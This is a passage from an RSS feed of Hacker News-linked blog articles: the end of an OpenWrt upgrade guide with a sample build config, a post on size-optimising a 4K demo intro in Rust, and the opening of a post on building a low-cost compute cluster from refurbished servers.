<!--<p>Side note: the <i>why</i> is pretty interesting, but would go far beyond the scope of this guide, so I'll just link you to the <a href="https://lists.openwrt.org/pipermail/openwrt-devel/2018-October/014324.html">mailing list thread</a> and the <a href="https://en.wikipedia.org/wiki/Multi-level_cell">MLC Wikipedia page</a>.-->
</p><details><summary>Sample <code>dmesg</code> output</summary>
SLC example:
<pre>[    2.252914] nand: device found, Manufacturer ID: 0x20, Chip ID: 0xdc
[    2.259309] nand: ST Micro NAND04GW3B2DN6
[    2.263313] nand: 512 MiB, <b>SLC</b>, erase size: 128 KiB, page size: 2048, OOB size: 64</pre>
MLC example:
<pre>[    0.825198] nand: device found, Manufacturer ID: 0xec<!--not actually hynix' ID-->, Chip ID: 0xdc
[    0.831588] nand: Hynix NAND 512MiB 3,3V 8-bit
[    0.836191] nand: 512MiB, <b>MLC</b>, page size: 2048, OOB size: 64</pre>
</details>

<h2>Step 1: Preparing an OpenWrt boot image</h2>
<ul>
<li>Set up an <a href="https://openwrt.org/docs/guide-developer/quickstart-build-images">OpenWrt build environment</a>, and configure it to include just the bare minimum
</li><li>Push additional files into your image using the <code>files/</code> directory
</li><li>Build <code>openwrt-*-vmlinux-initramfs-lzma.elf</code> with <kbd>make FILES=files/</kbd>
</li></ul>
<p>To get around the problem that the old kernel can't read the new filesystem and vice versa, we temporarily boot into a self-contained <i>initramfs</i> environment. This is essentially just a Linux kernel that has its own file system embedded and lives entirely in the kernel partition. Given our size constraints (~3.4MB), this image needs to be stripped down as much as possible and only come with a basic configuration to reach your network.
</p><p>Begin by following the <a href="https://openwrt.org/docs/guide-developer/quickstart-build-images">Quick Image Building Guide</a>. Start off by verifying that your build environment is working correctly by compiling a normal OpenWrt image by just modifying the Target System settings. <!--Note that the build system (not just during <code>feeds update</code>, but during <code>make</code> as well) requires connecting to a multitude of external hosts, so you might need an exception from your corporate firewall if you are behind such one. The error message in non-verbose mode is quite cryptic.-->
</p><p>When you feel ready, reissue <kbd>make menuconfig</kbd> and disable as much packages as possible. A <code>&lt;*&gt;</code> or <code>[*]</code> indicates that the package will be pre-installed and take up precious disk space. However, you must install an ssh daemon (dropbear) and the sysupgrade tool. You could also directly modify the <code>.config</code> file in your OpenWrt build environment.
</p><details><summary>Sample <code>.config</code> file</summary>
<pre><!--{{{-->
CONFIG_MODULES=y
CONFIG_HAVE_DOT_CONFIG=y
CONFIG_TARGET_ar71xx=y
CONFIG_TARGET_ar71xx_mikrotik=y
CONFIG_TARGET_ar71xx_mikrotik_DEVICE_nand-large=y
CONFIG_HAS_SUBTARGETS=y
CONFIG_HAS_DEVICES=y
CONFIG_TARGET_BOARD="ar71xx"
CONFIG_TARGET_SUBTARGET="mikrotik"
CONFIG_TARGET_PROFILE="DEVICE_nand-large"
CONFIG_TARGET_ARCH_PACKAGES="mips_24kc"
CONFIG_DEFAULT_TARGET_OPTIMIZATION="-Os -pipe -mno-branch-likely -mips32r2 -mtune=24kc"
CONFIG_CPU_TYPE="24kc"
CONFIG_LINUX_4_14=y
CONFIG_DEFAULT_base-files=y
CONFIG_DEFAULT_busybox=y
CONFIG_DEFAULT_dnsmasq=y
CONFIG_DEFAULT_dropbear=y
CONFIG_DEFAULT_firewall=y
CONFIG_DEFAULT_fstools=y
CONFIG_DEFAULT_ip6tables=y
CONFIG_DEFAULT_iptables=y
CONFIG_DEFAULT_iwinfo=y
CONFIG_DEFAULT_kmod-ath9k=y
CONFIG_DEFAULT_kmod-gpio-button-hotplug=y
CONFIG_DEFAULT_kmod-ipt-offload=y
CONFIG_DEFAULT_kmod-usb-ledtrig-usbport=y
CONFIG_DEFAULT_kmod-usb-ohci=y
CONFIG_DEFAULT_kmod-usb2=y
CONFIG_DEFAULT_libc=y
CONFIG_DEFAULT_libgcc=y
CONFIG_DEFAULT_logd=y
CONFIG_DEFAULT_mtd=y
CONFIG_DEFAULT_nand-utils=y
CONFIG_DEFAULT_netifd=y
CONFIG_DEFAULT_odhcp6c=y
CONFIG_DEFAULT_odhcpd-ipv6only=y
CONFIG_DEFAULT_opkg=y
CONFIG_DEFAULT_ppp=y
CONFIG_DEFAULT_ppp-mod-pppoe=y
CONFIG_DEFAULT_swconfig=y
CONFIG_DEFAULT_uboot-envtools=y
CONFIG_DEFAULT_uci=y
CONFIG_DEFAULT_uclient-fetch=y
CONFIG_DEFAULT_urandom-seed=y
CONFIG_DEFAULT_urngd=y
CONFIG_DEFAULT_wpad-basic=y
CONFIG_AUDIO_SUPPORT=y
CONFIG_GPIO_SUPPORT=y
CONFIG_PCI_SUPPORT=y
CONFIG_USB_SUPPORT=y
CONFIG_USB_GADGET_SUPPORT=y
CONFIG_BIG_ENDIAN=y
CONFIG_USES_INITRAMFS=y
CONFIG_USES_SQUASHFS=y
CONFIG_USES_MINOR=y
CONFIG_HAS_MIPS16=y
CONFIG_NAND_SUPPORT=y
CONFIG_mips=y
CONFIG_ARCH="mips"
CONFIG_TARGET_ROOTFS_INITRAMFS=y
CONFIG_TARGET_INITRAMFS_COMPRESSION_LZMA=y
CONFIG_EXTERNAL_CPIO=""
CONFIG_TARGET_ROOTFS_TARGZ=y
CONFIG_TARGET_ROOTFS_SQUASHFS=y
CONFIG_TARGET_SQUASHFS_BLOCK_SIZE=256
CONFIG_TARGET_UBIFS_FREE_SPACE_FIXUP=y
CONFIG_TARGET_UBIFS_JOURNAL_SIZE=""
CONFIG_SHADOW_PASSWORDS=y
CONFIG_KERNEL_BUILD_USER=""
CONFIG_KERNEL_BUILD_DOMAIN=""
CONFIG_KERNEL_PRINTK=y
CONFIG_KERNEL_CRASHLOG=y
CONFIG_KERNEL_SWAP=y
CONFIG_KERNEL_DEBUG_FS=y
CONFIG_KERNEL_KALLSYMS=y
CONFIG_KERNEL_DEBUG_KERNEL=y
CONFIG_KERNEL_DEBUG_INFO=y
CONFIG_KERNEL_AIO=y
CONFIG_KERNEL_FHANDLE=y
CONFIG_KERNEL_FANOTIFY=y
CONFIG_KERNEL_MAGIC_SYSRQ=y
CONFIG_KERNEL_COREDUMP=y
CONFIG_KERNEL_ELF_CORE=y
CONFIG_KERNEL_PRINTK_TIME=y
CONFIG_KERNEL_CGROUPS=y
CONFIG_KERNEL_FREEZER=y
CONFIG_KERNEL_CGROUP_FREEZER=y
CONFIG_KERNEL_CGROUP_DEVICE=y
CONFIG_KERNEL_CGROUP_PIDS=y
CONFIG_KERNEL_CPUSETS=y
CONFIG_KERNEL_CGROUP_CPUACCT=y
CONFIG_KERNEL_RESOURCE_COUNTERS=y
CONFIG_KERNEL_MM_OWNER=y
CONFIG_KERNEL_MEMCG=y
CONFIG_KERNEL_MEMCG_KMEM=y
CONFIG_KERNEL_CGROUP_SCHED=y
CONFIG_KERNEL_FAIR_GROUP_SCHED=y
CONFIG_KERNEL_RT_GROUP_SCHED=y
CONFIG_KERNEL_BLK_CGROUP=y
CONFIG_KERNEL_NET_CLS_CGROUP=y
CONFIG_KERNEL_NETPRIO_CGROUP=y
CONFIG_KERNEL_NAMESPACES=y
CONFIG_KERNEL_UTS_NS=y
CONFIG_KERNEL_IPC_NS=y
CONFIG_KERNEL_USER_NS=y
CONFIG_KERNEL_PID_NS=y
CONFIG_KERNEL_NET_NS=y
CONFIG_KERNEL_DEVPTS_MULTIPLE_INSTANCES=y
CONFIG_KERNEL_POSIX_MQUEUE=y
CONFIG_KERNEL_SECCOMP_FILTER=y
CONFIG_KERNEL_SECCOMP=y
CONFIG_KERNEL_IP_MROUTE=y
CONFIG_KERNEL_SQUASHFS_FRAGMENT_CACHE_SIZE=3
CONFIG_KERNEL_CC_OPTIMIZE_FOR_PERFORMANCE=y
CONFIG_USE_SSTRIP=y
CONFIG_USE_UCLIBCXX=y
CONFIG_PKG_CHECK_FORMAT_SECURITY=y
CONFIG_PKG_ASLR_PIE_REGULAR=y
CONFIG_PKG_CC_STACKPROTECTOR_REGULAR=y
CONFIG_KERNEL_CC_STACKPROTECTOR_REGULAR=y
CONFIG_KERNEL_STACKPROTECTOR=y
CONFIG_PKG_FORTIFY_SOURCE_1=y
CONFIG_PKG_RELRO_FULL=y
CONFIG_BINARY_FOLDER=""
CONFIG_DOWNLOAD_FOLDER=""
CONFIG_LOCALMIRROR=""
CONFIG_AUTOREBUILD=y
CONFIG_BUILD_SUFFIX=""
CONFIG_TARGET_ROOTFS_DIR=""
CONFIG_EXTERNAL_KERNEL_TREE=""
CONFIG_KERNEL_GIT_CLONE_URI=""
CONFIG_BUILD_LOG_DIR=""
CONFIG_EXTRA_OPTIMIZATION="-fno-caller-saves -fno-plt"
CONFIG_TARGET_OPTIMIZATION="-Os -pipe -mno-branch-likely -mips32r2 -mtune=24kc"
CONFIG_SOFT_FLOAT=y
CONFIG_USE_MIPS16=y
CONFIG_EXTRA_BINUTILS_CONFIG_OPTIONS=""
CONFIG_EXTRA_GCC_CONFIG_OPTIONS=""
CONFIG_GDB=y
CONFIG_USE_MUSL=y
CONFIG_SSP_SUPPORT=y
CONFIG_BINUTILS_VERSION_2_31_1=y
CONFIG_BINUTILS_VERSION="2.31.1"
CONFIG_GCC_VERSION="8.3.0"
CONFIG_LIBC="musl"
CONFIG_TARGET_SUFFIX="musl"
CONFIG_IB=y
CONFIG_IB_STANDALONE=y
CONFIG_TARGET_PREINIT_SUPPRESS_STDERR=y
CONFIG_TARGET_PREINIT_TIMEOUT=2
CONFIG_TARGET_PREINIT_IFNAME=""
CONFIG_TARGET_PREINIT_IP="192.168.1.1"
CONFIG_TARGET_PREINIT_NETMASK="255.255.255.0"
CONFIG_TARGET_PREINIT_BROADCAST="192.168.1.255"
CONFIG_TARGET_INIT_PATH="/usr/sbin:/usr/bin:/sbin:/bin"
CONFIG_TARGET_INIT_ENV=""
CONFIG_TARGET_INIT_CMD="/sbin/init"
CONFIG_TARGET_INIT_SUPPRESS_STDERR=y
CONFIG_PER_FEED_REPO=y
CONFIG_FEED_packages=y
CONFIG_FEED_luci=y
CONFIG_FEED_routing=y
CONFIG_FEED_telephony=y
CONFIG_PACKAGE_base-files=y
CONFIG_PACKAGE_busybox=y
CONFIG_BUSYBOX_CUSTOM=y
CONFIG_BUSYBOX_DEFAULT_HAVE_DOT_CONFIG=y
CONFIG_BUSYBOX_DEFAULT_INCLUDE_SUSv2=y
CONFIG_BUSYBOX_DEFAULT_LONG_OPTS=y
CONFIG_BUSYBOX_DEFAULT_SHOW_USAGE=y
CONFIG_BUSYBOX_DEFAULT_FEATURE_VERBOSE_USAGE=y
CONFIG_BUSYBOX_DEFAULT_FEATURE_COMPRESS_USAGE=y
CONFIG_BUSYBOX_DEFAULT_LFS=y
CONFIG_BUSYBOX_DEFAULT_FEATURE_DEVPTS=y
CONFIG_BUSYBOX_DEFAULT_FEATURE_PIDFILE=y
CONFIG_BUSYBOX_DEFAULT_PID_FILE_PATH="/var/run"
CONFIG_BUSYBOX_DEFAULT_FEATURE_PREFER_APPLETS=y
CONFIG_BUSYBOX_DEFAULT_BUSYBOX_EXEC_PATH="/proc/self/exe"
CONFIG_BUSYBOX_DEFAULT_FEATURE_SYSLOG=y
CONFIG_BUSYBOX_DEFAULT_PLATFORM_LINUX=y
CONFIG_BUSYBOX_DEFAULT_CROSS_COMPILER_PREFIX=""
CONFIG_BUSYBOX_DEFAULT_SYSROOT=""
CONFIG_BUSYBOX_DEFAULT_EXTRA_CFLAGS=""
CONFIG_BUSYBOX_DEFAULT_EXTRA_LDFLAGS=""
CONFIG_BUSYBOX_DEFAULT_EXTRA_LDLIBS=""
CONFIG_BUSYBOX_DEFAULT_INSTALL_APPLET_SYMLINKS=y
CONFIG_BUSYBOX_DEFAULT_PREFIX="./_install"
CONFIG_BUSYBOX_DEFAULT_NO_DEBUG_LIB=y
CONFIG_BUSYBOX_DEFAULT_FEATURE_BUFFERS_GO_ON_STACK=y</pre></details></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://gir.st/blog/upgrading-openwrt.html">https://gir.st/blog/upgrading-openwrt.html</a></em></p>]]>
            </description>
            <link>https://gir.st/blog/upgrading-openwrt.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23742942</guid>
            <pubDate>Sun, 05 Jul 2020 23:08:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing a winning 4K intro in Rust]]>
            </title>
            <description>
<![CDATA[
Score 266 | Comments 63 (<a href="https://news.ycombinator.com/item?id=23742870">thread link</a>) | @Dowwie
<br/>
July 5, 2020 | https://www.codeslow.com/2020/07/writing-winning-4k-intro-in-rust.html | <a href="https://web.archive.org/web/*/https://www.codeslow.com/2020/07/writing-winning-4k-intro-in-rust.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-4371838969983872321" itemprop="description articleBody">
<div><p><span>I recently wrote my first 4K intro in Rust and released it at the Nova 2020 where it took first place in the new school intro competition. Writing a 4K intro is quite involved and requires you to master many different areas at the same time. Here I will focus on what I learned about making Rust code as small as possible.</span></p><p><iframe allowfullscreen="" height="322" src="https://www.youtube.com/embed/SIkkYRQ07tU" width="387" youtube-src-id="SIkkYRQ07tU"></iframe></p><p>You can view the demo on<span>&nbsp;</span><a href="https://www.youtube.com/watch?v=SIkkYRQ07tU">youtube</a>, download the executable at<span>&nbsp;</span><a href="https://www.pouet.net/prod.php?which=85924">pouet</a><span>&nbsp;</span>or get the source code from<span>&nbsp;</span><a href="https://github.com/janiorca/sphere_dance">github</a></p><p>A 4K intro is a demo where the entire program ( including any data ) has two be 4096 bytes or less so it is important that the code is as space efficient as possible. Rust has a bit of a reputation for creating bloated executables so I wanted to find out if is possible to create very space efficient code with it.</p><p>The entire intro is written in a combination of Rust and glsl. Glsl is used for rendering everything on screen but Rust does everything else; world creation, camera and object control, creating instruments and playing music etc.</p><p>Some of the features I depend on, such as xargo, are not yet part of stable Rust so I use the nightly rust toolchain. To install and use the nightly toolchain as default you need the following rustup commands.</p><pre data-info="" data-role="codeBlock"><code>rustup toolchain install nightly
rustup default nightly
</code></pre><p>I use<span>&nbsp;</span><a href="http://crinkler.net/">crinkler</a><span>&nbsp;</span>to compress the object file generated by the rust compiler.</p><p>I also used<span>&nbsp;</span><a href="https://github.com/laurentlb/Shader_Minifier">shader minifier</a><span>&nbsp;</span>for pre-processing the<span>&nbsp;</span><code>glsl</code><span>&nbsp;</span>shader to make it smaller and more crinkler friendly. The shader minifier doesn't support output into<span>&nbsp;</span><code>.rs</code><span>&nbsp;</span>files so I ended up using its raw output and manually copying it into my<span>&nbsp;</span><a href="http://shader.rs/">shader.rs</a><span>&nbsp;</span>file. (In hindsight, I should have written something to automate that stage. Or even created a PR for shader minifier)</p><p>The starting point was the proof of concept code I developed earlier (<a href="https://www.codeslow.com/2020/01/writing-4k-intro-in-rust.html">https://www.codeslow.com/2020/01/writing-4k-intro-in-rust.html</a>) which I thought was pretty lean at the time. That article also goes into but more detail about setting up the<span>&nbsp;</span><code>toml</code><span>&nbsp;</span>file and how to use xargo for compiling tiny executable.</p><p>Many of the most effective size optimizations have nothing to do with clever hacks but are the result of rethinking the design.</p><p>My initial design had one part of the code creating the world, including placing the spheres and another part was responsible for moving the spheres. At some point I realized that the sphere placement and sphere moving code were doing very similar things and I could merge them into one sightly more complicated function that did both. Unfortunately, this type of optimization can make the code less elegant and readable.</p><p>At some point you have to look at the compiled assembly code to understand what the code gets compiled into and what size optimizations are worth it. The Rust compiler has a very useful option,<span>&nbsp;</span><code>--emit=asm</code><span>&nbsp;</span>for outputting assembler code. The following command creates a<span>&nbsp;</span><code>.s</code><span>&nbsp;</span>assembly file;</p><pre data-info="" data-role="codeBlock"><code>xargo rustc --release --target i686-pc-windows-msvc -- --emit=asm
</code></pre><p>It is not necessary to be an expert in assembler to benefit from studying the assembler output but it definitely helps to have a basic understanding assembler syntax. The release version uses<span>&nbsp;</span><code>opt-level = "z</code><span>&nbsp;</span>which causes the compiler to optimize for the smallest possible size. This can make it a bit tricky to work out which part of the assembly code corresponds to which part of the Rust code.</p><p>I discovered that the Rust compiler can be surprisingly good at minimizing code; getting rid of unused code and unnecessary parameters and folding code. It can also do some strange things which is why it is essential to occasionally study the resulting assembly code.</p><p>I worked with two versions of the code; one version does logging and allows the viewer to manipulate the camera which is used for creating interesting camera paths. Rust allows you to define<span>&nbsp;</span><strong>features</strong><span>&nbsp;</span>that you can use to optionally include bits of functionality. The<span>&nbsp;</span><code>toml</code><span>&nbsp;</span>file has a<span>&nbsp;</span><strong>[features]</strong><span>&nbsp;</span>section that lets you declare the available features and their dependencies. My 4K intro has the following section in the<span>&nbsp;</span><code>toml</code><span>&nbsp;</span>file;</p><pre data-info="toml" data-role="codeBlock"><span>[</span><span>features</span><span>]</span>
<span>logger</span> <span>=</span> <span>[</span><span>]</span>
<span>fullscreen</span> <span>=</span> <span>[</span><span>]</span>
</pre><p>Neither of the optional features has dependencies so they effectively work as being conditional compilation flags. The conditional blocks of code are preceded by<span>&nbsp;</span><code>#[cfg(feature)]</code><span>&nbsp;</span>statement. Using features in itself does not make the code smaller but it makes development process much nicer when you easily switch between different feature sets.</p><pre data-info="rust" data-role="codeBlock">        <span>#[cfg(feature = "fullscreen")]</span>
        <span>{</span>
            
        <span>}</span>

        <span>#[cfg(not(feature = "fullscreen"))]</span>
        <span>{</span>
            
        <span>}</span>
</pre><p>Having inspected the compiled code I am certain that only the selected features get included in the compiled code.</p><p>One of the main uses of<span>&nbsp;</span><strong>features</strong><span>&nbsp;</span>was to enable logging and error checking for the debug build. The code loading and compiling the glsl shader failed frequently and without useful error messages it would have been extremely painful to find the problems.</p><p>When putting code inside an<span>&nbsp;</span><code>unsafe{}</code><span>&nbsp;</span>block I sort of assumed that all safety checks would be disabled within this block but this is not true, all the usual checks are still applied and these checks can be expensive.</p><p>By default Rust range checks all array accesses. Take the following Rust code</p><pre data-info="rust" data-role="codeBlock">    delay_counter <span>=</span> sequence<span>[</span> play_pos <span>]</span><span>;</span>
</pre><p>Before doing the table look up the compiler would insert code that checks that play_pos is not indexing past the end of sequence and panic if that was the case. This adds considerable size to the code as there can be a lot of table look-ups like this.</p><p>Converting the above code into</p><pre data-info="rust" data-role="codeBlock">    delay_counter <span>=</span> <span>*</span>sequence<span>.</span><span>get_unchecked</span><span>(</span> play_pos <span>)</span><span>;</span>
</pre><p>tells the compiler to not perform any range checks and just do the table look-up. This is clearly a potentially dangerous operation and can thus only be performed within an<span>&nbsp;</span><code>unsafe</code><span>&nbsp;</span>code block</p><p>Initially all my loops used the idiomatic rust way of doing loops, using the<span>&nbsp;</span><code>for x in 0..10</code><span>&nbsp;</span>syntax which I just assumed would be compiled into tightest possible loop. Surprisingly, this was not the case. The simplest case;</p><pre data-info="rust" data-role="codeBlock"><span>for</span> x <span>in</span> <span>0</span><span>..</span><span>10</span> <span>{</span>
    
<span>}</span>
</pre><p>would get translated into assembly code that did the following;</p><pre data-info="" data-role="codeBlock"><code>    setup loop variable
loop:
    check for loop condition    
    if loop finished, jump to end
    // do code inside loop
    unconditionally jump to loop
end:
</code></pre><p>whereas if did the following rust code</p><pre data-info="rust" data-role="codeBlock"><span>let</span> x <span>=</span> <span>0</span><span>;</span>
<span>loop</span><span>{</span>
    
    x <span>+=</span> <span>1</span><span>;</span>
    <span>if</span> i <span>==</span> <span>10</span> <span>{</span>
        <span>break</span><span>;</span>
    <span>}</span>
<span>}</span>
</pre><p>would get directly compiled into;</p><pre data-info="" data-role="codeBlock"><code>    setup loop variable
loop:
    // do code inside loop
    check for loop condition    
    if loop not finished, jump to loop
end:
</code></pre><p>Note that the loop condition is checked at the end of each loop which makes the unconditional jump unnecessary. This is small space saving for one loop but they do add up when there are 30 loops in the program.</p><p>The other, much harder to understand, problem with the idiomatic Rust loop is that in some cases it the compiler would add some additional iterator setup code that really bloated the code. I never fully understood what triggered this additional iterator setup as it was always trivial to replace the<span>&nbsp;</span><code>for {}</code><span>&nbsp;</span>constructs with a<span>&nbsp;</span><code>loop{}</code><span>&nbsp;</span>construct.</p><p>I spent a lot of time optimizing the<span>&nbsp;</span><code>glsl</code><span>&nbsp;</span>code and one of the best class of optimizations ( which also usually made the code run faster) was to operate on an entire vector at a time instead of operating at a component at a time.</p><p>For example, the ray tracing code use a fast<span>&nbsp;</span><a href="http://www.cse.yorku.ca/~amana/research/grid.pdf">grid traversal algorithm</a><span>&nbsp;</span>to check which parts of the map each ray visits. The original algorithm considers each axis separately but it is possible to rewrite the algorithm so it considers all axes at the same time and does not need any branches. Rust doesn't really have a native vector type like glsl but you can use intrinsics to tell it to use SIMD instructions.</p><p>To use intrinsics I would convert the following code</p><pre data-info="rust" data-role="codeBlock">        global_spheres<span>[</span> CAMERA_ROT_IDX <span>]</span><span>[</span> <span>0</span> <span>]</span> <span>+=</span> camera_rot_speed<span>[</span> <span>0</span> <span>]</span><span>*</span>camera_speed<span>;</span>
        global_spheres<span>[</span> CAMERA_ROT_IDX <span>]</span><span>[</span> <span>1</span> <span>]</span> <span>+=</span> camera_rot_speed<span>[</span> <span>1</span> <span>]</span><span>*</span>camera_speed<span>;</span>
        global_spheres<span>[</span> CAMERA_ROT_IDX <span>]</span><span>[</span> <span>2</span> <span>]</span> <span>+=</span> camera_rot_speed<span>[</span> <span>2</span> <span>]</span><span>*</span>camera_speed<span>;</span>
</pre><p>into</p><pre data-info="rust" data-role="codeBlock">        <span>let</span> <span>mut</span> dst<span>:</span>x86<span>:</span><span>:</span>__m128 <span>=</span> core<span>:</span><span>:</span>arch<span>:</span><span>:</span>x86<span>:</span><span>:</span><span>_mm_load_ps</span><span>(</span>global_spheres<span>[</span> CAMERA_ROT_IDX <span>]</span><span>.</span><span>as_mut_ptr</span><span>(</span><span>)</span><span>)</span><span>;</span>
        <span>let</span> <span>mut</span> src<span>:</span>x86<span>:</span><span>:</span>__m128 <span>=</span> core<span>:</span><span>:</span>arch<span>:</span><span>:</span>x86<span>:</span><span>:</span><span>_mm_load_ps</span><span>(</span>camera_rot_speed<span>.</span><span>as_mut_ptr</span><span>(</span><span>)</span><span>)</span><span>;</span>
        dst <span>=</span> core<span>:</span><span>:</span>arch<span>:</span><span>:</span>x86<span>:</span><span>:</span><span>_mm_add_ps</span><span>(</span> dst<span>,</span> src<span>)</span><span>;</span>
        core<span>:</span><span>:</span>arch<span>:</span><span>:</span>x86<span>:</span><span>:</span><span>_mm_store_ss</span><span>(</span> <span>(</span><span>&amp;</span><span>mut</span> global_spheres<span>[</span> CAMERA_ROT_IDX <span>]</span><span>)</span><span>.</span><span>as_mut_ptr</span><span>(</span><span>)</span><span>,</span> dst <span>)</span><span>;</span>
</pre><p>which would be quite a bit smaller ( but a lot less readable ). Sadly, for some reason this broke the debug build while working perfectly on the release build. Clearly, this is a problem with my intrinsics knowledge and not a problem with Rust. This is something I would spend more time on for my next 4K intro as the space saving were significant.</p><p>There are lot of standard Rust crates for loading OpenGL functions but by default they all load a very large set of OpenGL functions. Each loaded function takes up some space because the loader has to know its name. Crinkler does a very good job of compressing this kind of code but it is not able to completely get rid of the overhead so I had to create my own version<span>&nbsp;</span><code>gl.rs</code><span>&nbsp;</span>that only includes the OpenGL functions that are used in the code.</p><p>My first objective was to write a competitive proper 4K intro to prove that language was suitable for scenarios where every single byte counts and you really need low level control. Typically this has been the sole domain of assembler and C. The secondary objective was to write it using idiomatic Rust as much possible.</p><p>I think I was fairly successful on the first objective. At no point during the development did I feel that Rust was holding me back in any way or that I was sacrificing performance or capabilities because I was using Rust rather than C.</p><p>I was less successful on the second objective. There is far too much<span>&nbsp;</span><code>unsafe</code><span>&nbsp;</span>code that doesn't really need to be there.<span>&nbsp;</span><code>Unsafe</code><span>&nbsp;</span>has a corrupting effect; it is very easy to use<span>&nbsp;</span><code>unsafe</code><span>&nbsp;</span>code to quickly accomplish something (like using mutable statics) but once the unsafe code is there it begets more unsafe code and suddenly it …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.codeslow.com/2020/07/writing-winning-4k-intro-in-rust.html">https://www.codeslow.com/2020/07/writing-winning-4k-intro-in-rust.html</a></em></p>]]>
            </description>
            <link>https://www.codeslow.com/2020/07/writing-winning-4k-intro-in-rust.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23742870</guid>
            <pubDate>Sun, 05 Jul 2020 23:00:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Poor Man's Cluster]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23742683">thread link</a>) | @FilingTrader
<br/>
July 5, 2020 | http://www.regressionist.com/2020/07/05/poor-mans-cluster/ | <a href="https://web.archive.org/web/*/http://www.regressionist.com/2020/07/05/poor-mans-cluster/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<figure><img src="http://www.regressionist.com/wp-content/uploads/2020/06/cluster.jpg" alt="" srcset="http://www.regressionist.com/wp-content/uploads/2020/06/cluster.jpg 765w, http://www.regressionist.com/wp-content/uploads/2020/06/cluster-300x229.jpg 300w, http://www.regressionist.com/wp-content/uploads/2020/06/cluster-624x476.jpg 624w" sizes="(max-width: 765px) 100vw, 765px"></figure>



<p>This part might just be me cargo-culting, but I feel like even a startup quant fund needs a compute cluster. I once even heard a joke that any self-respecting quant should be able expand their computational needs to fill an arbitrarily large number of servers. The cluster I’ve just built is a low-budget clunker, made of a motley bunch of leftover and refurbished servers, linked together with parts off eBay. But I’m very proud of it!</p>



<h2>Maximum compute per dollar</h2>



<div><p>New servers cost a fortune, and only a small fraction of the cost is for the actual CPU. These servers are designed for use cases that cannot tolerate downtime, where the administrators are remote, and where all the hardware and even software must be supported by some company with expensive contracts. In contrast, my cluster is designed only for research. Downtime is ok, as long as no data gets lost and I get get back up and running easily. So, my focus is only on maximizing performance given a limited budget. I’m optimizing for compute per dollar. (Incidentally, I’ve found the <a href="https://www.cpubenchmark.net/cpu_list.php">PassMark CPU mark</a> to accurately reflect how well each CPU can handle my workload.)</p><p>There is a stigma around buying refurbished enterprise grade equipment that I don’t understand. Basic compute servers that cost $25k three years ago now cost only $2.5k, refurbished at places like <a href="https://www.metservers.com/">metservers.com</a> or <a href="https://www.stalliontek.com/">stalliontek.com</a>. Both of these companies provide warranties, too. Even better, these are real servers that already exist and can be shipped to you immediately, rather than waiting months for new ones due to things like worldwide memory shortages. New <a href="https://store.mellanox.com/products/mellanox-mcx515a-ccat-connectx-5-en-network-interface-card-100gbe-single-port-qsfp28-pcie3-0-x16-tall-bracket-rohs-r6.html">Mellanox 100GbE</a> infiniband cards cost $795 each, but on <a href="https://www.ebay.com/sch/i.html?_nkw=Mellanox+ConnectX-3+56GbE&amp;_sacat=0&amp;LH_TitleDesc=0&amp;_osacat=0&amp;_odkw=Mellanox+ConnectX-3+56">eBay 56GbE cards</a> can be bought for $40 each.</p></div>



<figure><img src="http://www.regressionist.com/wp-content/uploads/2020/07/R630_front.jpg" alt="" srcset="http://www.regressionist.com/wp-content/uploads/2020/07/R630_front.jpg 598w, http://www.regressionist.com/wp-content/uploads/2020/07/R630_front-300x87.jpg 300w" sizes="(max-width: 598px) 100vw, 598px"></figure>



<figure><img src="http://www.regressionist.com/wp-content/uploads/2020/07/R630_back.jpg" alt="" srcset="http://www.regressionist.com/wp-content/uploads/2020/07/R630_back.jpg 594w, http://www.regressionist.com/wp-content/uploads/2020/07/R630_back-300x107.jpg 300w" sizes="(max-width: 594px) 100vw, 594px"></figure>



<h2>NVMe vs. memory</h2>



<p>Memory can really drive up the cost of a server, doubling or tripling the price. I don’t think loading up on RAM is cost-effective at scale. Instead, I recommend NVMe drives as an affordable alternative. Typical RAM for a refurbished Dell R630 server would be DDR4-2133, which has bandwidth of 136Gbps. The Samsung 970 EVO Plus 2TB NVMe drive has a read speed of 28Gbps. With the right software, an old infiniband card can max out its 56Gbps bandwidth by reading simultaneously from NVMe drives on only 2-3 other boxes in the cluster. For my workload, this is close enough to RAM speed that I/O ceases to be a bottleneck, and I can focus on just getting the computations done.</p>



<figure><img src="http://www.regressionist.com/wp-content/uploads/2020/07/nvme_vs_ram.png" alt="" srcset="http://www.regressionist.com/wp-content/uploads/2020/07/nvme_vs_ram.png 828w, http://www.regressionist.com/wp-content/uploads/2020/07/nvme_vs_ram-300x200.png 300w, http://www.regressionist.com/wp-content/uploads/2020/07/nvme_vs_ram-768x512.png 768w, http://www.regressionist.com/wp-content/uploads/2020/07/nvme_vs_ram-624x416.png 624w" sizes="(max-width: 828px) 100vw, 828px"></figure>



<p>I have also chosen to go with retail NVMe drives. They cost far less than enterprise NVMe drives, and they have the same speed (PCIe Gen 3.0 x4) as all but the very newest enterprise drives. The advantage of enterprise drives is the longer lifetime, measured in hundreds or thousands of Terabytes written). But I tend to read far more than I write. Another advantage is that some enterprise drives are dual-port. This is a high-availability feature that allows two hosts to access the same drive, keeping it connected in case of host failure. But as I’ve said, I don’t need expensive high-availability features.</p>



<h2>Distributed storage</h2>



<p>Having a distributed filesystem simplifies coding on a cluster. It makes it feel almost like just working on one big machine. Each job reads and writes to a shared filesystem that is mounted locally, using traditional posix system calls.</p>



<figure><img src="http://www.regressionist.com/wp-content/uploads/2020/07/mfs_and_beegfs.png" alt="" srcset="http://www.regressionist.com/wp-content/uploads/2020/07/mfs_and_beegfs.png 901w, http://www.regressionist.com/wp-content/uploads/2020/07/mfs_and_beegfs-300x142.png 300w, http://www.regressionist.com/wp-content/uploads/2020/07/mfs_and_beegfs-768x364.png 768w, http://www.regressionist.com/wp-content/uploads/2020/07/mfs_and_beegfs-624x296.png 624w" sizes="(max-width: 901px) 100vw, 901px"></figure>



